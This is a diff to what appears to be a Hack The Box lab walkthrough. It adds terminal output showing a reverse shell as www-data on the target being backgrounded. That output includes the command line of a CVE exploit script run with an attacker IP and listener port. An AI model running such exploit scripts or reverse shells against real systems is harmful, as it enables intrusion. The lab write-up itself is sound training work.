@@ -1424,6 +1424,15 @@ To achieve a "Gold Standard" interactive shell, follow these steps:
 #### Step 1: Background the Shell
 
 In your current terminal, press **Ctrl+Z**. This suspends the reverse shell and returns you to your Kali prompt.
+
+Result:
+```shell
+www-data@variatype:~/portal.variatype.htb/public/files$ ^Z
+zsh: suspended  python3 varlib_cve_2025_66034.py --ip 10.10.14.71 --port 4444 --path    --url
+
+┌──(kali㉿kali)-[~/…/HTB/SN10/VariaType/varlib-cve-2025-66034]
+└─$ 
+```
 <div align="center">
 <br>
 <br>
